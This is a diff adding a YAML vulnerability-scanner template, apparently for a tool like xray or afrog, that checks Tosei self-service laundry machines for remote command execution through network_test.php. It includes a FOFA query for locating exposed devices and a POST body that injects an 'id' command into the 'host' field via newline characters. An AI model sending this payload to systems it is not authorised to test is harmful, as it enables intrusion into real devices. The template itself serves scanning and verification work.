@@ -1,0 +1,24 @@
+id: tosei-network-test-rce
+
+info:
+  name: Tosei自助洗衣机network_test.php接口存在远程命令执行漏洞
+  author: avic123
+  severity: critical
+  verified: true
+  description: |
+    Tosei自助洗衣机network_test.php接口存在远程命令执行漏洞
+    fofa语法：body="tosei_login_check.php"
+  reference:
+    - https://mp.weixin.qq.com/s/Db9VL401Q5vLZCcw1fiZPw
+  tags: Tosei,rce
+  created: 2025/09/09
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /cgi-bin/login.php/cgi-bin/network_test.php
+      body: |
+        host=%0aid%0a&command=ping
+    expression: response.status == 200 &&  "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
+expression: r0()
